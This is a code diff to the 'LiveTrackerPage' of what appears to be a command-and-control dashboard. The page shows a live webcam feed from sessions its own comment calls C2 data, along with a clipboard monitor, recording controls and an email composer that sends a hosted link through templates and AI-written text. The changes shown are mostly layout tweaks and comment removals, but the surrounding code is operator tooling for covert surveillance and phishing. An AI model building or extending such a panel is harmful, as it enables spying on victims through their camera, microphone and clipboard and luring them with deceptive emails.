@@ -13,7 +13,7 @@ import { ClipboardMonitor } from '@/components/clipboard-monitor';
 import { SessionHistory } from '@/components/live-tracker/session-history';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
-import { Webcam, Video, Mic, Terminal, Info, Mail, Sparkles, Send as SendIcon, Save, PlusCircle, Link as LinkIcon, Eye, ClipboardCopy, Bold, Italic, Underline, Pilcrow, Image as ImageIcon } from 'lucide-react';
+import { Webcam, Video, Mic, Terminal, Info, Mail, Sparkles, Send as SendIcon, Save, PlusCircle, Link as LinkIcon, Eye, ClipboardCopy, Bold, Italic, Underline, Pilcrow, Image as ImageIcon, StopCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/hooks/use-auth';
@@ -98,7 +98,6 @@ export default function LiveTrackerPage() {
   const { user } = useAuth();
   const channelRef = useRef<BroadcastChannel | null>(null);
 
-  // New state for email functionality
   const [isEmailModalOpen, setIsEmailModalOpen] = useState(false);
   const [emailTemplates, setEmailTemplates] = useState<Template[]>([]);
   const [selectedTemplate, setSelectedTemplate] = useState<Template | null>(null);
@@ -142,7 +141,6 @@ export default function LiveTrackerPage() {
     setIsRecording(null);
   }
 
-  // Centralized event listener for C2 data
   useEffect(() => {
     channelRef.current = new BroadcastChannel('netrax_c2_channel');
     
@@ -253,7 +251,6 @@ export default function LiveTrackerPage() {
       toast({ title: 'Stop Recording Command Sent' });
   }
 
-  // --- Email Functionality ---
   const openEmailModal = (url: string) => {
     setHostedUrlForEmail(url);
     const storedTemplates = localStorage.getItem('netra-templates');
@@ -333,7 +330,7 @@ export default function LiveTrackerPage() {
         subject = customValues.subject;
         body = customValues.body;
         recipient = customValues.recipientEmail;
-    } else { // Select, New, AI tabs
+    } else {
         const emailValues = emailForm.getValues();
          const validation = await emailForm.trigger();
         if (!validation) {
@@ -351,10 +348,9 @@ export default function LiveTrackerPage() {
     }
 
     try {
-        let finalBody = body.replace(/\\n/g, '<br />'); // Ensure newlines are rendered
+        let finalBody = body.replace(/\\n/g, '<br />'); 
         let finalSubject = subject;
         
-        // This is a simple replacement, a more robust solution would be better
         if(currentEmailTab !== 'custom') {
             finalBody = renderPreview(finalBody, true);
             finalSubject = renderPreview(finalSubject);
@@ -402,13 +398,11 @@ export default function LiveTrackerPage() {
       
       const emailFormValues = emailForm.getValues();
 
-      // Replace template variables
       for (const key in variableValues) {
           const value = variableValues[key] || (forSending ? '' : `{{${key}}}`);
           renderedText = renderedText.replace(new RegExp(`\\{\\{${key}\\}\\}`, 'g'), value);
       }
       
-      // Replace link placeholder
       let linkHtml = '';
       switch (emailFormValues.linkType) {
         case 'button':
@@ -481,7 +475,7 @@ export default function LiveTrackerPage() {
           <EmailOutbox sentEmails={sentEmails} />
         </div>
         <div className="xl:col-span-1 flex flex-col gap-6">
-          <SessionHistory sessions={sessionsMap} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
+          <SessionHistory sessions={sessions} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
           
             <Card className="bg-primary/10">
               <CardHeader>
@@ -489,7 +483,7 @@ export default function LiveTrackerPage() {
                   { (isCameraActive || isMicActive) && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge> }
               </CardHeader>
               <CardContent className="space-y-4">
-                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center">
+                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center overflow-hidden">
                       {liveFeedSrc ? <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/> : <p className="text-muted-foreground text-sm">Camera feed inactive.</p>}
                   </div>
                   <div className="grid grid-cols-2 gap-2">
@@ -523,9 +517,8 @@ export default function LiveTrackerPage() {
       </div>
     </div>
 
-     {/* Email Composer Dialog */}
-      <Dialog open={isEmailModalOpen} onOpenChange={setIsEmailModalOpen}>
-        <DialogContent className="max-w-4xl">
+     <Dialog open={isEmailModalOpen} onOpenChange={setIsEmailModalOpen}>
+        <DialogContent className="max-w-4xl h-[90vh] md:h-auto flex flex-col">
           <DialogHeader>
             <DialogTitle>New Message</DialogTitle>
           </DialogHeader>
@@ -534,7 +527,7 @@ export default function LiveTrackerPage() {
               <strong>SMTP Not Configured.</strong> You must configure email settings before you can send emails.
             </div>
           )}
-          <div className="grid md:grid-cols-2 gap-8 py-4">
+          <div className="grid md:grid-cols-2 gap-8 py-4 overflow-y-auto md:overflow-visible">
             <div className="space-y-4">
               <Tabs defaultValue="custom" value={currentEmailTab} onValueChange={setCurrentEmailTab}>
                 <TabsList className="grid w-full grid-cols-4">
@@ -625,7 +618,7 @@ export default function LiveTrackerPage() {
             </div>
             <div className="space-y-2">
               <Label>Live Preview</Label>
-              <Card className="h-[500px]">
+              <Card className="h-full min-h-[50vh] md:min-h-full">
                 <CardContent className="p-4 h-full overflow-y-auto">
                   {currentEmailTab === 'custom' ? (
                      <div className="prose prose-sm dark:prose-invert max-w-none">
